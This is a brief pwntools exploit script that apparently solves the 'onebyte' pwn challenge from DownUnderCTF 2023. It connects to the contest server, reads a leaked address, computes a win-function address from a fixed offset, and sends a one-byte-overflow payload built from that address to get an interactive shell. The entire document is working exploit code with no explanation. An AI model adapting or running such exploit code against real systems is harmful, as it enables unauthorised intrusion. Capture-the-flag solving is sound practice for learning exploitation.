from pwn import *
context.log_level = 'info'
# context.arch = "amd64"
from ctypes import *
e = context.binary = ELF('onebyte')
while True:
    # r= e.process()
    r = remote('2023.ductf.dev', 30018)
    r.recvuntil(b"Free junk: 0x")
    init = int(r.recvline(), 16)
    win  = 0x46+init
    print(hex(win))
    pause()
    r.sendline(p32(win)*4+b"\x00")
    try:
        r.sendline("ls")
    except:
        r.close()
        continue
    r.interactive()